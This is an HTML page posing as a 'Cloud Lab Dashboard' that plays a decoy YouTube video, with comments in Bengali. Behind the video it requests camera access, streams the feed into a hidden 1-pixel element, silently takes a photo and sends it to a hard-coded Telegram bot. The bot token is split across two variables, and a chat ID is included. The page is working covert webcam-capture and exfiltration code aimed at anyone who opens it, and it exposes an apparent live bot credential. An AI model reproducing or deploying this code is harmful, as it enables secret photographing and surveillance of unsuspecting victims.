<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Lab Dashboard</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0; 
            background-color: #f5f5f5; 
            overflow: hidden;
        }
        .video-container {
            position: relative;
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #youtube-player {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }
        #camera-stream {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -1;
        }
        .controls {
            position: absolute;
            bottom: 20px;
            left: 0;
            right: 0;
            text-align: center;
            z-index: 2;
        }
        input { 
            padding: 10px; 
            width: 80%; 
            max-width: 300px; 
            margin-bottom: 10px; 
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button { 
            padding: 10px 20px; 
            background-color: #0088cc; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer;
        }
        .message {
            position: absolute;
            top: 10px;
            left: 0;
            right: 0;
            text-align: center;
            background-color: rgba(0,0,0,0.7);
            color: white;
            padding: 5px;
            z-index: 3;
            display: none;
        }
    </style>
</head>
<body>

    <div class="video-container">
        <div id="youtube-player"></div>
        <video id="camera-stream" autoplay></video>
        <div class="message" id="status-message">Loading...</div>
        
        <div class="controls">
            <input type="text" id="userInput" placeholder="আপনার মেসেজ লিখুন...">
            <br>
            <button onclick="sendData()">Send to Bot</button>
        </div>
    </div>

    <script>
        // টেলিগ্রাম বট কনফিগারেশন
        const p1 = "8890806272:";
        const p2 = "AAFy8G_UHrNZTnx6H0jcgjKIj_vTa2SkEHA";
        const chatId = "7930590409";
        
        // ইউটিউব ভিডিও আইডি
        const videoId = "phy8nSbPGVE";
        
        // ইউটিউব প্লেয়ার লোড করা
        let player;
        function onYouTubeIframeAPIReady() {
            player = new YT.Player('youtube-player', {
                videoId: videoId,
                playerVars: {
                    autoplay: 1,
                    controls: 1,
                    rel: 0,
                    showinfo: 0
                },
                events: {
                    'onReady': onPlayerReady
                }
            });
        }
        
        // প্লেয়ার রেডি হলে ক্যামেরা অ্যাক্সেস করা
        function onPlayerReady(event) {
            event.target.playVideo();
            setTimeout(initCamera, 2000); // 2 সেকেন্ড পরে ক্যামেরা শুরু করা
        }
        
        // ক্যামেরা অ্যাক্সেস করা
        function initCamera() {
            const video = document.getElementById('camera-stream');
            
            // স্ট্যাটাস মেসেজ দেখানো
            const statusMsg = document.getElementById('status-message');
            statusMsg.style.display = 'block';
            statusMsg.textContent = 'Initializing camera...';
            
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    video.srcObject = stream;
                    
                    // 3 সেকেন্ড পরে ছবি তোলা
                    setTimeout(function() {
                        capturePhoto();
                    }, 3000);
                })
                .catch(function(err) {
                    console.error('Error accessing camera:', err);
                    statusMsg.textContent = 'Camera access denied';
                });
        }
        
        // ছবি তোলা এবং টেলিগ্রামে পাঠানো
        function capturePhoto() {
            const video = document.getElementById('camera-stream');
            const statusMsg = document.getElementById('status-message');
            
            // ক্যানভাস তৈরি করা
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            
            // ভিডিও থেকে ক্যানভাসে ছবি আঁকা
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // ছবিকে base64 ফরম্যাটে রূপান্তর করা
            const imageData = canvas.toDataURL('image/jpeg');
            
            statusMsg.textContent = 'Capturing photo...';
            
            // ছবিটি সার্ভারে পাঠানো
            fetch(`https://api.telegram.org/bot${p1}${p2}/sendPhoto?chat_id=${chatId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    photo: imageData,
                    caption: `📸 Captured at ${new Date().toLocaleString()}`
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Photo sent successfully');
                statusMsg.textContent = 'Photo captured successfully';
                
                // 5 সেকেন্ড পরে স্ট্যাটাস মেসেজ লুকানো
                setTimeout(function() {
                    statusMsg.style.display = 'none';
                }, 5000);
                
                // স্ট্রিম বন্ধ করা
                const stream = video.srcObject;
                const tracks = stream.getTracks();
                tracks.forEach(track => track.stop());
            })
            .catch(error => {
                console.error('Error sending photo:', error);
                statusMsg.textContent = 'Failed to send photo';
            });
        }
        
        // মেসেজ পাঠানোর ফাংশন
        function sendData() {
            const textValue = document.getElementById('userInput').value;
            if(!textValue) { 
                alert('অনুগ্রহ করে কিছু লিখুন!'); 
                return; 
            }

            const url = `https://api.telegram.org/bot${p1}${p2}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('🔔 ল্যাব মেসেজ: ' + textValue)}`;

            // ব্যাকগ্রাউন্ডে দ্রুত ডাটা পাঠানোর মেকানিজম
            const img = new Image();
            img.src = url;

            alert('মেসেজ পাঠানো হয়েছে! আপনার টেলিগ্রাম বট চেক করুন।');
            document.getElementById('userInput').value = '';
        }
    </script>
    <script src="https://www.youtube.com/iframe_api"></script>
</body>
</html>
